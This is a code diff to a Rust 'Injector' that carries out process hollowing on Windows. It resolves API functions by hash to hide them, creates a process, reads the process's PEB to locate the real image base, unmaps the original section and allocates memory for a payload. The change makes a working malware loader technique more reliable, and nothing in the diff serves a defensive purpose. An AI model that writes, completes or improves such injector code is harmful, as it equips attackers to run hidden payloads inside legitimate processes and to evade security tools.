@@ -102,10 +102,12 @@ impl Injector {
             let create_process = resolve_function(kernel32, hash_str(b"CreateProcessA"));
             let virtual_alloc_ex = resolve_function(kernel32, hash_str(b"VirtualAllocEx"));
             let write_process_memory = resolve_function(kernel32, hash_str(b"WriteProcessMemory"));
+            let read_process_memory = resolve_function(kernel32, hash_str(b"ReadProcessMemory"));
             let get_thread_context = resolve_function(kernel32, hash_str(b"GetThreadContext"));
             let set_thread_context = resolve_function(kernel32, hash_str(b"SetThreadContext"));
             let resume_thread = resolve_function(kernel32, hash_str(b"ResumeThread"));
             let unmap_view = resolve_function(ntdll, hash_str(b"NtUnmapViewOfSection"));
+            let nt_query_info = resolve_function(ntdll, hash_str(b"NtQueryInformationProcess"));
 
             if create_process.is_null() || unmap_view.is_null() || virtual_alloc_ex.is_null() {
                 return Err(());
@@ -115,9 +117,11 @@ impl Injector {
             type FnNtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, PVOID) -> i32;
             type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
             type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
+            type FnReadProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, PVOID, usize, *mut usize) -> i32;
             type FnGetThreadContext = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> i32;
             type FnSetThreadContext = unsafe extern "system" fn(HANDLE, *const CONTEXT) -> i32;
             type FnResumeThread = unsafe extern "system" fn(HANDLE) -> u32;
+            type FnNtQueryInformationProcess = unsafe extern "system" fn(HANDLE, u32, *mut PROCESS_BASIC_INFORMATION, u32, *mut u32) -> i32;
 
             let mut si: STARTUPINFOA = core::mem::zeroed();
             si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
@@ -140,12 +144,27 @@ impl Injector {
 
             if success == 0 { return Err(()); }
 
-            // 2. Unmap Original Section (Simplified: Assume 0x400000 base or query it)
-            // In strict no_std we skip determining actual base via PEB for now and try standard bases
-            // Or typically we don't need to unmap if we just allocate new memory and redirect IP.
-            // But spec says "NtUnmapViewOfSection".
-            // Let's assume standard base 0x400000.
-            core::mem::transmute::<_, FnNtUnmapViewOfSection>(unmap_view)(pi.hProcess, 0x400000 as PVOID);
+            // 2. Unmap Original Section
+            let mut pbi: PROCESS_BASIC_INFORMATION = core::mem::zeroed();
+            core::mem::transmute::<_, FnNtQueryInformationProcess>(nt_query_info)(
+                pi.hProcess,
+                0, // ProcessBasicInformation
+                &mut pbi,
+                core::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+                core::ptr::null_mut()
+            );
+
+            let mut peb: PEB = core::mem::zeroed();
+            core::mem::transmute::<_, FnReadProcessMemory>(read_process_memory)(
+                pi.hProcess,
+                pbi.PebBaseAddress,
+                &mut peb as *mut _ as PVOID,
+                core::mem::size_of::<PEB>(),
+                core::ptr::null_mut()
+            );
+
+            let image_base = peb.ImageBaseAddress;
+            core::mem::transmute::<_, FnNtUnmapViewOfSection>(unmap_view)(pi.hProcess, image_base);
 
             // 3. Allocate Memory for Payload
             let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(
